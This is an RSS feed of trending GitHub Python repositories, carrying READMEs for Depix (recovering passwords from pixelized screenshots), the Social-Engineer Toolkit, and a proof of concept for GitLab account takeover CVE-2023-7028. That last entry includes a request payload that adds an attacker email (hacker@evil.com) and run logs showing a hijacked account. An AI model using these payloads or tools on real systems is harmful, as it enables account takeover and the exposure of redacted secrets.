<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-01-16T01:42:03Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>spipm/Depix</title>
    <updated>2024-01-16T01:42:03Z</updated>
    <id>tag:github.com,2024-01-16:/spipm/Depix</id>
    <link href="https://github.com/spipm/Depix" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Recovers passwords from pixelized screenshots&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Depix&lt;/h1&gt; &#xA;&lt;p&gt;Depix is a PoC for a technique to recover plaintext from pixelized screenshots.&lt;/p&gt; &#xA;&lt;p&gt;This implementation works on pixelized images that were created with a linear box filter. In &lt;a href=&#34;https://www.spipm.nl/2030.html&#34;&gt;this article&lt;/a&gt; I cover background information on pixelization and similar research.&lt;/p&gt; &#xA;&lt;h2&gt;Example&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/spipm/Depix/main/docs/img/Recovering_prototype_latest.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Updates&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;27 nov &#39;23: Refactored and removed all this pip stuff. I like scripts I can just run. If a package can&#39;t be found, just install it. Also added &lt;code&gt;tool_show_boxes.py&lt;/code&gt; to show how bad the box detector is (you have to really cut out the pixels exactly). Made a TODO to create a version that just cuts out boxes of static size.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the dependencies&lt;/li&gt; &#xA; &lt;li&gt;Run Depix:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 depix.py \&#xA;    -p /path/to/your/input/image.png \&#xA;    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \&#xA;    -o /path/to/your/output.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Example usage&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Depixelize example image created with Notepad and pixelized with Greenshot. Greenshot averages by averaging the gamma-encoded 0-255 values, which is Depix&#39;s default mode.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 depix.py \&#xA;    -p images/testimages/testimage3_pixels.png \&#xA;    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Result: &lt;img src=&#34;https://raw.githubusercontent.com/spipm/Depix/main/docs/img/example_output_multiword.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Depixelize example image created with Sublime and pixelized with Gimp, where averaging is done in linear sRGB. The backgroundcolor option filters out the background color of the editor.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 depix.py \&#xA;    -p images/testimages/sublime_screenshot_pixels_gimp.png \&#xA;    -s images/searchimages/debruin_sublime_Linux_small.png \&#xA;    --backgroundcolor 40,41,35 \&#xA;    --averagetype linear&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Result: &lt;img src=&#34;https://raw.githubusercontent.com/spipm/Depix/main/docs/img/output_depixelizedExample_linear.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;(Optional) You can view if the box detector thingie finds your pixels with &lt;code&gt;tool_show_boxes.py&lt;/code&gt;. Consider a smaller batch of pixels if this looks all mangled. Example of good looking boxes:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 tool_show_boxes.py \ &#xA;    -p images/testimages/testimage3_pixels.png \&#xA;    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;(Optional) You can create pixelized image by using &lt;code&gt;tool_gen_pixelated.py&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 tool_gen_pixelated.py -i /path/to/image.png -o pixed_output.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For a detailed explanation, please try to run &lt;code&gt;$ python3 depix.py -h&lt;/code&gt; and &lt;code&gt;tool_gen_pixelated.py&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;About&lt;/h2&gt; &#xA;&lt;h3&gt;Making a Search Image&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Cut out the pixelated blocks from the screenshot as a single rectangle.&lt;/li&gt; &#xA; &lt;li&gt;Paste a &lt;a href=&#34;https://en.wikipedia.org/wiki/De_Bruijn_sequence&#34;&gt;De Bruijn sequence&lt;/a&gt; with expected characters in an editor with the same font settings as your input image (Same text size, similar font, same colors).&lt;/li&gt; &#xA; &lt;li&gt;Make a screenshot of the sequence.&lt;/li&gt; &#xA; &lt;li&gt;Move that screenshot into a folder like &lt;code&gt;images/searchimages/&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Run Depix with the &lt;code&gt;-s&lt;/code&gt; flag set to the location of this screenshot.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Making a Pixelized Image&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Cut out the pixelized blocks exactly. See the &lt;code&gt;testimages&lt;/code&gt; for examples.&lt;/li&gt; &#xA; &lt;li&gt;It tries to detect blocks but it doesn&#39;t do an amazing job. Play with the &lt;code&gt;tool_show_boxes.py&lt;/code&gt; script and different cutouts if your blocks aren&#39;t properly detected.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Algorithm&lt;/h3&gt; &#xA;&lt;p&gt;The algorithm uses the fact that the linear box filter processes every block separately. For every block it pixelizes all blocks in the search image to check for direct matches.&lt;/p&gt; &#xA;&lt;p&gt;For some pixelized images Depix manages to find single-match results. It assumes these are correct. The matches of surrounding multi-match blocks are then compared to be geometrically at the same distance as in the pixelized image. Matches are also treated as correct. This process is repeated a couple of times.&lt;/p&gt; &#xA;&lt;p&gt;After correct blocks have no more geometrical matches, it will output all correct blocks directly. For multi-match blocks, it outputs the average of all matches.&lt;/p&gt; &#xA;&lt;h3&gt;Known limitations&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The algorithm matches by integer block-boundaries. As a result, it has the underlying assumption that for all characters rendered (both in the de Brujin sequence and the pixelated image), the text positioning is done at pixel level. However, some modern text rasterizers position text &lt;a href=&#34;http://agg.sourceforge.net/antigrain.com/research/font_rasterization/&#34;&gt;at sub-pixel accuracies&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;You need to know the font specifications and in some cases the screen settings with which the screenshot was taken. However, if there is enough plaintext in the original image you might be able to use the original as a search image.&lt;/li&gt; &#xA; &lt;li&gt;This approach doesn&#39;t work if additional image compression is performed, because it messes up the colors of a block.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Future development&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Implement more filter functions&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Create more averaging filters that work like some popular editors do.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create a new tool that utilizes HMMs&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;After creating this program, someone pointed me to a &lt;a href=&#34;https://www.researchgate.net/publication/305423573_On_the_Ineffectiveness_of_Mosaicing_and_Blurring_as_Tools_for_Document_Redaction&#34;&gt;research document&lt;/a&gt; from 2016 where a group of researchers managed to create a similar tool. Their tool has better precision and works across many different fonts. While their original source code is not public, an open-source implementation exists at &lt;a href=&#34;https://github.com/JonasSchatz/DepixHMM&#34;&gt;DepixHMM&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Edit 16 Feb &#39;22: &lt;a href=&#34;https://bishopfox.com/authors/dan-petro&#34;&gt;Dan Petro&lt;/a&gt; created the tool UnRedacter (&lt;a href=&#34;https://bishopfox.com/blog/unredacter-tool-never-pixelation&#34;&gt;write-up&lt;/a&gt;, &lt;a href=&#34;https://github.com/BishopFox/unredacter&#34;&gt;source&lt;/a&gt;) to crack a &lt;a href=&#34;https://labs.jumpsec.com/can-depix-deobfuscate-your-data/&#34;&gt;challenge&lt;/a&gt; that was created as a response to Depix!&lt;/p&gt; &#xA;&lt;p&gt;Still, anyone who is passionate about this type of depixelization is encouraged to implement their own HMM-based version and share it.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>trustedsec/social-engineer-toolkit</title>
    <updated>2024-01-16T01:42:03Z</updated>
    <id>tag:github.com,2024-01-16:/trustedsec/social-engineer-toolkit</id>
    <link href="https://github.com/trustedsec/social-engineer-toolkit" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Social-Engineer Toolkit (SET) repository from TrustedSec - All new versions of SET will be deployed here.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The Social-Engineer Toolkit (SET)&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Copyright &lt;span&gt;Â©&lt;/span&gt; 2020&lt;/li&gt; &#xA; &lt;li&gt;Written by: David Kennedy (ReL1K) @HackingDave&lt;/li&gt; &#xA; &lt;li&gt;Company: &lt;a href=&#34;https://www.trustedsec.com&#34;&gt;TrustedSec&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has a number of custom attack vectors that allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC â an information security consulting firm located in Cleveland, Ohio.&lt;/p&gt; &#xA;&lt;p&gt;DISCLAIMER: This is &lt;em&gt;only&lt;/em&gt; for testing purposes and can only be used where strict consent has been given. Do not use this for illegal purposes, period. Please read the LICENSE under readme/LICENSE for the licensing of SET.&lt;/p&gt; &#xA;&lt;h4&gt;Supported platforms:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Linux&lt;/li&gt; &#xA; &lt;li&gt;Mac OS X (experimental)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;h2&gt;Install via requirements.txt&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip3 install -r requirements.txt&#xA;python3 setup.py &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Install SET&lt;/h2&gt; &#xA;&lt;p&gt;=======&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Mac OS X&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h4&gt;Windows 10 WSL/WSL2 Kali Linux&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install set -y&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Kali Linux on Windows 10 is a minimal installation so it doesn&#39;t have any tools installed. You can easily install Social Engineer Toolkit on WSL/WSL2 without needing pip using the above command.&lt;/p&gt; &#xA;&lt;h4&gt;Linux&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/&#xA;cd setoolkit&#xA;pip3 install -r requirements.txt&#xA;python setup.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;SET Tutorial&lt;/h2&gt; &#xA;&lt;p&gt;For a full document on how to use SET, &lt;a href=&#34;https://github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User_Manual.pdf&#34;&gt;visit the SET user manual&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Bugs and enhancements&lt;/h2&gt; &#xA;&lt;p&gt;For bug reports or enhancements, please open an &lt;a href=&#34;https://github.com/trustedsec/social-engineer-toolkit/issues&#34;&gt;issue&lt;/a&gt; here. &lt;br&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Vozec/CVE-2023-7028</title>
    <updated>2024-01-16T01:42:03Z</updated>
    <id>tag:github.com,2024-01-16:/Vozec/CVE-2023-7028</id>
    <link href="https://github.com/Vozec/CVE-2023-7028" rel="alternate"></link>
    <summary type="html">&lt;p&gt;This repository presents a proof-of-concept of CVE-2023-7028&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2023-7028 | Account-Take-Over Gitlab&lt;/h1&gt; &#xA;&lt;h2&gt;Disclamer&lt;/h2&gt; &#xA;&lt;p&gt;This code is a proof of concept of the vulnerability, I&#39;m not pushing anyone to use it on gitlab instances they don&#39;t own.&lt;br&gt; This tool has been developed for research and educational purposes only and I will not be held responsible for any use you may make of it.&lt;/p&gt; &#xA;&lt;h2&gt;Description:&lt;/h2&gt; &#xA;&lt;p&gt;CVE-2023-7028 refers to an Account-Take-Over vulnerability that allows users to take control of the gitlab administrator account without user interaction.&lt;/p&gt; &#xA;&lt;p&gt;The vulnerability lies in the management of emails when resetting passwords. An attacker can provide 2 emails and the reset code will be sent to both.&lt;br&gt; It is therefore possible to provide the e-mail address of the target account as well as that of the attacker, and to reset the administrator password.&lt;br&gt; &lt;em&gt;(Gitlab points out that 2-factor authentication prevents this vulnerability from being exploited, since an attacker, even after resetting the password, will not be able to log in.)&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;This vulnerability was discovered by &lt;a href=&#34;https://hackerone.com/asterion04&#34;&gt;asterion04&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Payload:&lt;/h2&gt; &#xA;&lt;p&gt;Here&#39;s an example payload&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;user[email][]=my.target@example.com&amp;amp;user[email][]=hacker@evil.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;POC:&lt;/h2&gt; &#xA;&lt;h5&gt;Method 1: Using temp email&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com&#xA;&#xA;[DEBUG] Getting temporary mail&#xA;[DEBUG] Scrapping available domains on 1secmail.com&#xA;[DEBUG] 8 domains found&#xA;[DEBUG] Temporary mail: 6grp7ert9y@laafd.com&#xA;[DEBUG] Getting authenticity_token ...&#xA;[DEBUG] authenticity_token = bc91lpzwTOaY9dg5SWjLvvDDb61j6ZunCX4DXYlSnWz9Y3zK35SPiLNShhrDrPVDgY_AzQjzpD5qVt2WXeolog&#xA;[DEBUG] Sending reset password request&#xA;[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !&#xA;[DEBUG] Waiting mail, sleeping for 7.5 seconds&#xA;[DEBUG] Getting link using temp-mail | Try NÂ°1 on 5&#xA;[DEBUG] Getting last mail for 6grp7ert9y@laafd.com&#xA;[DEBUG] 1 mail(s) found&#xA;[DEBUG] Reading the last one&#xA;[DEBUG] Generating new password&#xA;[DEBUG] Getting authenticity_token ...&#xA;[DEBUG] authenticity_token = RN6gypVz7Zxtu2zRsJmKPsDHNumIH_UPvdn7aQoWRBnUcqmW1hcu8kYcMvI6XbTDsYuZieMFypbe8SWi3q781w&#xA;[DEBUG] Changing password to l3mG2v2XN4UBzbN18ZkW&#xA;[DEBUG] CVE_2023_7028 succeed !&#xA;        You can connect on https://gitlab.example.com/users/sign_in&#xA;        Username: my.target@example.com&#xA;        Password: l3mG2v2XN4UBzbN18ZkW&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Method 2: Using evil email&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com -e hacker@evil.com&#xA;&#xA;[DEBUG] Getting authenticity_token ...&#xA;[DEBUG] authenticity_token = 1Yt1EUeWSL-oiSV7v1Z6ghdCDG3w0FFCQB8Uc5B5GAodVNJ26OlPT8HtYYleGXB9F0otas3gnHOtRfhFall8pQ&#xA;[DEBUG] Sending reset password request&#xA;[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !&#xA;        Input link received by mail: https://gitlab.example.com/users/password/edit?reset_password_token=U8PSU7DXdebdTD3GjMiX&#xA;[DEBUG] Generating new password&#xA;[DEBUG] Getting authenticity_token ...&#xA;[DEBUG] authenticity_token = N7gs43C9ZMxdniA9UEzzfH2Rlhgejt75M1Kw88vaarP_Z4uE38JjPDT6ZM-xA_mDfZm3HyO-E8jeCFzFMfoOHA&#xA;[DEBUG] Changing password to EU7XIYjlawjb5tH2jgmU&#xA;[DEBUG] CVE_2023_7028 succeed !&#xA;        You can connect on https://gitlab.example.com/users/sign_in&#xA;        Username: my.target@example.com&#xA;        Password: EU7XIYjlawjb5tH2jgmU&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Help&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-md&#34;&gt;$ python3 .\CVE-2023-7028.py -h&#xA;usage: CVE-2023-7028.py [-h] -u URL -t TARGET [-e EVIL]&#xA;&#xA;This tool automates CVE-2023-7028 on gitlab&#xA;&#xA;optional arguments:&#xA;  -h, --help            show this help message and exit&#xA;  -u URL, --url URL     Gitlab url&#xA;  -t TARGET, --target TARGET&#xA;                        Target email&#xA;  -e EVIL, --evil EVIL  Evil email&#xA;  -p PASSWORD, --password PASSWORD&#xA;                        Password&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Note:&lt;/h4&gt; &#xA;&lt;p&gt;Without the &lt;code&gt;--evil&lt;/code&gt; option, which specifies the attacker&#39;s email address, the script uses a &lt;strong&gt;public temp-mail&lt;/strong&gt; to find the password reset link.&lt;br&gt; =&amp;gt; &lt;em&gt;Be careful if this poc is used during a pentest.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Versions concerned&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;16.1 to 16.1.5&lt;/li&gt; &#xA; &lt;li&gt;16.2 to 16.2.8&lt;/li&gt; &#xA; &lt;li&gt;16.3 to 16.3.6&lt;/li&gt; &#xA; &lt;li&gt;16.4 to 16.4.4&lt;/li&gt; &#xA; &lt;li&gt;16.5 to 16.5.5&lt;/li&gt; &#xA; &lt;li&gt;16.6 to 16.6.3&lt;/li&gt; &#xA; &lt;li&gt;16.7 to 16.7.1&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;References:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/&#34;&gt;https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.gitlab.com/ee/install/docker.html&#34;&gt;https://docs.gitlab.com/ee/install/docker.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0030/&#34;&gt;https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0030/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>